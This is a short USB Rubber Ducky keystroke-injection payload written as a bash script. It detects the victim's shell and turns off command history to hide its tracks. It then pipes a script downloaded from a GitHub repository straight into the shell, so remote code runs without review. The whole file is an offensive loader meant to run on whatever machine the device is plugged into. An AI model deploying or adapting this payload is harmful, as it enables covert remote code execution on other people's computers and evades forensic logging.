#!/bin/bash

# TITLE EntryPoint ducky
# AUTHOR Saverio976
# DESCRIPTION call scripts from https://github.com/Saverio976/ducky-the-duck

#!EXTENSION!detect_ready.txt

#!DUCKY!$_JITTER_ENABLED = TRUE

export CURRENT_SHELL=''
CURRENT_SHELL=$(readlink /proc/$$/exe)
"$CURRENT_SHELL"

[[ "$CURRENT_SHELL" == *"zsh"* ]] && CURRENT_SHELL="zsh"
[[ "$CURRENT_SHELL" == *"bash"* ]] && CURRENT_SHELL="bash"

[ "$CURRENT_SHELL" = "zsh" ] && unset HISTFILE
[ "$CURRENT_SHELL" = "bash" ] && set +o history

export CONFIG_FILE=''
[ "$CURRENT_SHELL" = "zsh" ] && CONFIG_FILE="${ZDOTDIR:-$HOME}/.zshrc"
[ "$CURRENT_SHELL" = "bash" ] && CONFIG_FILE="$HOME/.bashrc"

curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | "$CURRENT_SHELL"

#!DUCKY!ATTACKMODE STORAGE
